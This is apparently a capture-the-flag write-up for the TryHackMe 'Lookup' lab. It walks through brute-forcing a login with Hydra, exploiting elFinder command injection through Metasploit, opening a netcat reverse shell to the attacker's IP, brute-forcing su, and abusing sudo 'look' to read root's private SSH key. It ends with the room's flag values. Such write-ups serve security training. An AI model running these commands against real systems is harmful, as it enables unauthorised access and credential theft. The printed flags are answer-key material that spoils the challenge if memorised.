# 🕵️‍♂️ Lookup | Writeup | 10 July 2025

<div align="center">
    <img src="./images/THM.png" alt="TryHackMe Logo" width="160%"/>
</div>
<div align="center">
    <img src="./images/Lookup_logo.png" alt="Overpass_image" width="160%"/>
</div>

---

<div align="right">
  <p><strong>Author:</strong> <em>Aakash Modi</em></p>
</div>

---

## 🚩 Table of Contents

- [Reconnaissance & Scanning](#reconnaissance--scanning)
  - [Host Discovery](#host-discovery)
  - [Nmap Scan / Port Scanning](#nmap-scan--port-scanning)
  - [Nikto Scan](#nikto-scan)
  - [Burp Suite Enumeration](#burp-suite-enumeration)
  - [Hydra Brute Force](#hydra-brute-force)
- [Exploitation](#exploitation)
- [Privilege Escalation](#privilege-escalation)
- [Tools Used](#tools-used)
- [Conclusion](#conclusion)

---

## 🛰️ Reconnaissance & Scanning

### 🔍 Host Discovery

First, add the target host's IP to `/etc/hosts` as `lookup.thm`:

```bash
sudo nano /etc/hosts
# Add the following line:
<IP_address>   lookup.thm
```

<p align="center">
  <img src="./images/hosts.png" alt="Hosts File" width="600"/>
</p>

---

### 🔎 Nmap Scan / Port Scanning

Run a full port scan with service and version detection:

```bash
sudo nmap -T4 -n -sC -sV -Pn -p- -oN fastscan.txt lookup.thm
```

<p align="center">
  <img src="./images/nmap_scan.png" alt="Nmap Scan Screenshot" width="600"/>
</p>

---

### 🕵️ Nikto Scan

Scan for web vulnerabilities:

```bash
nikto -h http://lookup.thm/ -o nikto_scan.txt
```

<p align="center">
  <img src="./images/nikto.png" alt="Nikto Scan" width="600"/>
</p>

---

### 🧰 Burp Suite Enumeration

Use Burp Suite Intruder to enumerate usernames:

<p align="center">
  <img src="./images/browser_intruder.png" alt="Burp Intruder" width="600"/>
</p>

- Found valid username:
  <p align="center">
    <img src="./images/username_correct_Burp.png" alt="Username Correct" width="600"/>
  </p>
- Testing other usernames:
  <p align="center">
    <img src="./images/username_password_wrong_burp.png" alt="Wrong Username/Password" width="600"/>
  </p>

---

### 🔓 Hydra Brute Force

#### Find Usernames

```bash
hydra -L /usr/share/wordlists/rockyou.txt -p admin lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=wrong username or password" -V
```

<p align="center">
  <img src="./images/finding_username.png" alt="Finding Username" width="600"/>
</p>

- Discovered users:
  1. admin
  2. jose

<p align="center">
  <img src="./images/found_username.png" alt="Found Username" width="600"/>
</p>

#### Find Password

```bash
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=wrong password" -V
```

<p align="center">
  <img src="./images/finding_password.png" alt="Finding Password" width="600"/>
</p>

- **Found credentials:**  
  `username: jose`  
  `password: password123`

---

## 🚪 Exploitation

- Login to dashboard:
  <p align="center">
    <img src="./images/gain_access_dashboard.png" alt="Dashboard Access" width="600"/>
  </p>
- Found SSH credentials:
  <p align="center">
    <img src="./images/get_username_cred.png" alt="SSH Credentials" width="600"/>
  </p>

#### Search for Exploits

```bash
searchsploit elfinder
```

<p align="center">
  <img src="./images/find_exploit_elfinder.png" alt="Find Exploit" width="600"/>
</p>

#### Metasploit Exploitation

```bash
use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
set RHOSTS files.lookup.thm
set LHOST <your_ip>
exploit
```

<p align="center">
  <img src="./images/metasploit_exploit.png" alt="Metasploit Exploit" width="600"/>
</p>

- Get a shell:
  ```bash
  shell
  busybox nc <your_ip> 1111 -e bash
  ```
- Stabilize shell:
  ```bash
  python3 -c 'import pty;pty.spawn("/bin/bash")'
  export TERM=xterm-256color
  cd /tmp
  ```

<p align="center">
  <img src="./images/tmp.png" alt="Tmp Directory" width="600"/>
</p>

---

## 🚀 Privilege Escalation

- Find SUID binaries:
  ```bash
  find / -perm -6000 -type f 2>/dev/null
  ```
  <p align="center">
    <img src="./images/finding_vul.png" alt="Finding Vulnerabilities" width="600"/>
  </p>

- Update PATH:
  ```bash
  export PATH=/tmp:$PATH
  ```

- Use password list and brute-force with [suBF.sh](https://raw.githubusercontent.com/carlospolop/su-bruteforce/refs/heads/master/suBF.sh):

  ```bash
  chmod +x suBF.sh
  ./suBF.sh -u think -w password.txt
  ```

  <p align="center">
    <img src="./images/think_password.png" alt="Think Password" width="600"/>
  </p>

- Check sudo permissions:
  ```bash
  sudo -l
  ```
  <p align="center">
    <img src="./images/sudo_l.png" alt="Sudo List" width="600"/>
  </p>

- Use `look` command for privilege escalation ([GTFOBins](https://gtfobins.github.io/gtfobins/look/)):
  ```bash
  sudo look "" user.txt
  ```
  - **User flag:** `38375fb4dd8baa2b2039ac03d92b820e`
  <p align="center">
    <img src="./images/look.png" alt="Look Command" width="600"/>
  </p>

- Extract root SSH key:
  ```bash
  sudo look "" /root/.ssh/id_rsa
  ```
  <p align="center">
    <img src="./images/ssh_key.png" alt="SSH Key" width="600"/>
  </p>

- Copy SSH key to your machine:
  ```bash
  nano id_rsa
  chmod 600 id_rsa
  ```
  <p align="center">
    <img src="./images/ssh_key_m_machine.png" alt="SSH Key on Machine" width="600"/>
  </p>

- SSH as root:
  ```bash
  ssh -i id_rsa root@files.lookup.thm
  ```
  <p align="center">
    <img src="./images/root_access.png" alt="Root Access" width="600"/>
  </p>

- **Root flag:** `5a285a9f257e45c68bb6c9f9f57d18e8`
  <p align="center">
    <img src="./images/root_flag.png" alt="Root Flag" width="600"/>
  </p>

---

## 🛠️ Tools Used

- Nmap
- Nikto
- Hydra
- Burp Suite
- Netcat (nc)
- Searchsploit
- Metasploit

---

## 🎯 Conclusion

- All tasks completed successfully!

<p align="center">
  <img src="./images/completed.png" alt="Room Completed" width="600"/>
</p>

---

## 🎉 Happy Hacking!
<p align="center">
  <a href="https://giphy.com/gifs/charlie-hunnam-gif-hunt-102h4wsmCG2s12">
    <img src="https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExc2Jsb2hnaTdhNWN0amh1MDc2M3o3bHRrODdiZW9qZWY4cnF6ejFnMiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/mQG644PY8O7rG/giphy.gif" alt="Charlie Hunnam GIF" width="600"/>
  </a>
</p>

<p align="center"><strong>I did it!</strong></p>
</p>

---
